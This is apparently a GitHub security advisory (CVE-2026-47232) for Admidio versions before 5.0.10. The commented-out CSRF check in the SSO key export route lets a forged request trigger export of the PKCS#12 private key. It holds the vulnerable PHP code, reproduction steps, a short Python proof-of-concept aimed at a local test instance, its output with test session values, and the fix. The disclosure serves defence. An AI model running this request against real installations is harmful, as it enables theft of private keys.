# [M] Admidio PKCS#12 private key export action lacks CSRF protection

## Summary
Severity: Medium
Advisory: GHSA-4rgq-38mh-9xqg
CVE: CVE-2026-47232
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-4rgq-38mh-9xqg
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

The sensitive `mode=export` action in `modules/sso/keys.php` exports a PKCS#12 bundle containing the configured private key and certificate, but the CSRF validation line is commented out. A forged cross-site POST from an administrator session can therefore trigger private key export without a valid form token.

## Vulnerable Code Links

- https://github.com/Admidio/admidio/blob/v5.0.9/modules/sso/keys.php#L83-L94
- https://github.com/Admidio/admidio/blob/v5.0.9/src/SSO/Service/KeyService.php#L108-L150

## Vulnerable Code

```php
// modules/sso/keys.php
case 'export':
// SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
$keyService = new KeyService($gDb);
$password = admFuncVariableIsValid($_POST, 'key_password', 'string');
$keyService->exportToPkcs12($getKeyUUID, $password);
break;
```

```php
// src/SSO/Service/KeyService.php
public function exportToPkcs12(string $keyUUID, string $password = '') {
$ssoKey = new Key($this->db);
$ssoKey->readDataByUuid($keyUUID);
...
openssl_pkcs12_export($certificate, $pkcs12, $privateKey, $password, ["friendly_name" => $name]);
header('Content-Type: application/x-pkcs12');
header('Content-Disposition: attachment; filename="' . $filename . '.p12"');
echo $pkcs12;
exit;
}
```


## What Does The Code Mean

The export route accepts a key UUID and export password from the request, then returns a PKCS#12 bundle containing the private key material and certificate as a direct browser download.

## Why The Code Is Vulnerable

The route is a sensitive action and should require a valid anti-CSRF token. Because the validation call is commented out, any attacker-controlled page can force an authenticated administrator’s browser to perform the export request.

## Verification Environment

- Application: Admidio `v5.0.9`
- Runtime: Dockerized Admidio + MariaDB on `http://localhost:18080`
- Validation mode: real deployed application, not isolated unit tests

## Steps To Reproduce

1. Log in as an administrator.
2. Create or seed an SSO key pair.
3. Send a POST request to `/modules/sso/keys.php?mode=export&uuid=<key-uuid>` with only `key_password=ExportPass123!` and no `adm_csrf_token`.
4. Verify that the response returns `application/x-pkcs12` and that the returned file parses successfully with OpenSSL.


## PoC Script

```python
import os
from pathlib import Path

from helpers import BASE_URL, login, new_session, save_json, save_text


KEY_UUID = os.environ["ADMIDIO_KEY_UUID"]


def main():
session = new_session()
login_result = login(session, "admin", "AdminPass123!")
resp = session.post(
    f"{BASE_URL}/modules/sso/keys.php?mode=export&uuid={KEY_UUID}",
    data={"key_password": "ExportPass123!"},
)
resp.raise_for_status()

Path("/home/ubuntu/bughunting/admidio/runtime_validation/output/exported_key.p12").write_bytes(resp.content)
save_json(
    "pkcs12_export_csrf_result.json",
    {
        "login": login_result,
        "status_code": resp.status_code,
        "content_type": resp.headers.get("Content-Type"),
        "content_length": len(resp.content),
        "content_disposition": resp.headers.get("Content-Disposition"),
    },
)


if __name__ == "__main__":
main()
```

## PoC Output

```text
{
  "content_disposition": "attachment; filename=\"Runtime_Test_Key.p12\"",
  "content_length": 2644,
  "content_type": "application/x-pkcs12",
  "login": {
"cookies": {
  "ADMIDIO_admidio_adm_SESSION_ID": "jpk70tcvbaq3gof7lqdq6penkb"
},
"csrf": "ztUJwMPATEKBdu2Qw3oJlnD0WeWLcn",
"json": {
  "status": "success",
  "url": "http://localhost:18080/modules/overview.php"
},
"status_code": 200
  },
  "status_code": 200
}

MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
PKCS7 Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2048, PRF hmacWithSHA256
Certificate bag
PKCS7 Data
Shrouded Keybag: PBES2, PBKDF2, AES-256-CBC, Iteration 2048, PRF hmacWithSHA256
```

## Impact

A cross-site request can trigger private key export in an administrator browser context. Same-origin policy normally prevents direct cross-site reading of the response, so the practical impact is lower than a direct exfiltration bug, but the application still performs a sensitive secret-export action without CSRF protection.

## Remediation And Suggestions

Restore CSRF validation and require a POST body token before exporting private key material.

```php
case 'export':
SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
$keyService = new KeyService($gDb);
$password = admFuncVariableIsValid($_POST, 'key_password', 'string');
$keyService->exportToPkcs12($getKeyUUID, $password);
break;
```

For additional hardening, consider requiring re-authentication or current-password confirmation before any private-key export.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-4rgq-38mh-9xqg
- https://github.com/Admidio/admidio
